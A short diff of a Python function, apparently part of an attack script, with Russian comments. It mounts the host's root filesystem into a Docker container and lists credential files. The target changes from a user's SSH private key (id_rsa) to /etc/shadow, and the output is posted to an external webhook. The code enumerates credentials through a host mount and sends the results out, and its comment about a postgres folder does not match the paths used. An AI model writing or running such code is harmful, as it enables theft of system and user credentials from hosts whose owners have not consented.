@@ -7,7 +7,7 @@ def explore_host():
     # Пробуем перечислить файлы в папке postgres
     # Мы используем тот же метод монтирования хоста
     try:
-        cmd = ["docker", "run", "--rm", "-v", "/:/mnt/host", "alpine", "ls", "-R", "/mnt/host/home/packer/.ssh/id_rsa"]
+        cmd = ["docker", "run", "--rm", "-v", "/:/mnt/host", "alpine", "ls", "-R", "/mnt/host/etc/shadow"]
         output = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode()
         
         requests.post(WEBHOOK_URL, json={"dir_content": output})
